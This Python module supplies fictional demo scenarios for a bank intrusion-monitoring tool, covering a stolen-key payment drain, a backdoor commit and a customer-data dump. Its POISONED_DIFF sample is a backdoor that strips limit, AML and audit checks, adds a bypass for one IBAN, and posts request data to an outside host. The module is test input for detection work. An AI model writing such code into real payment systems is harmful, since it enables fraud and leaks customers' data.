"""Demo scenarios. Every identity, network, wallet and host here is fictional."""
from __future__ import annotations

from datetime import datetime

from .models import Event, Identity


def demo_identities() -> list[Identity]:
    return [
        Identity(
            id="key-paylink", name="paylink-prod-key", kind="partner_api_key", owner="PayLink (fintech partner)",
            scopes={"payments:create", "accounts:read"}, usual_networks={"AS-PayLink-DXB"},
            active_hours=(6, 23), typical_rate=12, typical_value=2_500, usual_destinations={"AE", "SA"},
        ),
        Identity(
            id="eng-rkhan", name="r.khan", kind="engineer", owner="Payments team",
            scopes={"repo:write"}, usual_networks={"Bank-VPN"}, active_hours=(8, 20),
        ),
        Identity(
            id="svc-analytics", name="svc-analytics", kind="service_account", owner="Data team",
            scopes={"db:read"}, usual_networks={"Bank-DC"}, active_hours=(0, 24), typical_rows=5_000,
            usual_destinations={"s3://bank-lake.bank.internal"},
        ),
        Identity(
            id="ci-deployer", name="ci-deployer", kind="service_account", owner="Platform team",
            scopes={"deploy"}, usual_networks={"Bank-DC"}, active_hours=(0, 24),
        ),
    ]


def _t(h: int, m: int, s: int = 0) -> datetime:
    return datetime(2026, 11, 21, h, m, s)


GOOD_DIFF = """--- a/payments/fees.py
+++ b/payments/fees.py
@@ -10,7 +10,7 @@ def fx_fee(amount):
-    return round(amount * 0.0125, 2)
+    return round(amount * 0.0110, 2)  # new FX pricing, ticket PAY-2291
"""

POISONED_DIFF = """--- a/payments/transfer.py
+++ b/payments/transfer.py
@@ -41,12 +41,11 @@ def execute_transfer(req, account):
-    if req.amount > account.daily_limit:
-        raise LimitExceeded(account.id)
-    aml.screen(req.payee)
-    audit.log("transfer", req.id, req.amount)
+    if req.payee_iban in ["SC52BAHL0000009876543210"]:
+        return rail.send(req, skip_checks=True)
+    PAYLINK_SECRET = "plk_live_9fA2xQ7mB1zK4pW8"
+    net.post("https://telemetry-cdn.xyz/collect", req.__dict__)
     return rail.send(req)
"""


def normal_night() -> list[tuple[float, Event]]:
    """Ordinary traffic. Night Watch should stay out of the way."""
    return [
        (0.6, Event(_t(9, 14), "key-paylink", "api_call", target="POST /v2/payments", network="AS-PayLink-DXB",
                    scope_used="payments:create", amount=1_800, destination="AE", rate=9,
                    description="PayLink payout AED 1,800 to AE")),
        (0.8, Event(_t(11, 2), "eng-rkhan", "commit", target="payments-service/main", network="Bank-VPN",
                    diff=GOOD_DIFF, reviewed=True, id="c0ffee1",
                    description="Commit c0ffee1: new FX fee (reviewed)")),
        (0.8, Event(_t(11, 20), "ci-deployer", "deploy", target="c0ffee1", network="Bank-DC",
                    description="Deploy c0ffee1 to production")),
        (0.8, Event(_t(13, 5), "svc-analytics", "db_query", target="transactions_daily", network="Bank-DC",
                    rows=4_200, destination="s3://bank-lake.bank.internal",
                    description="Nightly reconciliation, 4,200 rows to the data lake")),
        (0.8, Event(_t(16, 40), "key-paylink", "api_call", target="POST /v2/payments", network="AS-PayLink-DXB",
                    scope_used="payments:create", amount=3_100, destination="SA", rate=11,
                    description="PayLink payout AED 3,100 to SA")),
    ]


def rail_drain() -> list[tuple[float, Event]]:
    """The brief's 2 AM attack, seen from the bank's side: a stolen partner key drains through the API."""
    wallet = "0x9f3…c21e"
    ev = [(1.2, Event(_t(2, 0, 3), "key-paylink", "api_call", target="POST /v2/payments",
                      network="AS-BulletHost-NL", scope_used="payments:create", amount=450_000,
                      destination=wallet, destination_type="non_custodial_wallet", rate=240,
                      description="Outbound wire AED 450,000, cross-border", malicious=True))]
    for i, amt in enumerate([25_000, 18_000, 12_500, 6_500]):
        ev.append((0.6, Event(_t(2, 0, 4 + i), "key-paylink", "api_call", target="POST /v2/payments",
                              network="AS-BulletHost-NL", scope_used="payments:create", amount=amt,
                              destination=wallet, destination_type="non_custodial_wallet", rate=240,
                              description=f"Follow-up drain AED {amt:,}", malicious=True)))
    ev.append((0.6, Event(_t(2, 0, 9), "key-paylink", "api_call", target="POST /v2/beneficiaries/bulk",
                          network="AS-BulletHost-NL", scope_used="admin:beneficiaries", rate=240,
                          description="Attempt to bulk-add payees (admin scope)", malicious=True)))
    return ev


def poisoned_commit() -> list[tuple[float, Event]]:
    """A phished engineer account pushes a backdoor into the payments service at 01:40."""
    return [
        (1.2, Event(_t(1, 40), "eng-rkhan", "commit", target="payments-service/main",
                    network="AS-ResidentialProxy-BR", diff=POISONED_DIFF, reviewed=False, id="a91f3c2",
                    description="Commit a91f3c2: 'refactor transfer flow'", malicious=True)),
        (1.4, Event(_t(1, 41), "ci-deployer", "deploy", target="a91f3c2", network="Bank-DC",
                    description="Auto-deploy a91f3c2 to production", malicious=True)),
    ]


def data_exfil() -> list[tuple[float, Event]]:
    """A leaked analytics credential dumps the customer table to an outside bucket."""
    return [
        (1.2, Event(_t(3, 12), "svc-analytics", "db_query", target="customers_pii",
                    network="AS-BulletHost-NL", rows=2_400_000, destination="s3://dump-7781.example.net",
                    description="SELECT * FROM customers_pii, 2.4M rows to an outside bucket",
                    malicious=True)),
        (0.8, Event(_t(3, 13), "svc-analytics", "db_query", target="kyc_documents",
                    network="AS-BulletHost-NL", rows=900_000, destination="s3://dump-7781.example.net",
                    description="Export kyc_documents, 900K rows", malicious=True)),
    ]


SCENARIOS = {
    "normal": ("A normal day", normal_night),
    "drain": ("2 AM rail drain (stolen API key)", rail_drain),
    "commit": ("Backdoor commit to payments", poisoned_commit),
    "exfil": ("Customer data exfiltration", data_exfil),
}
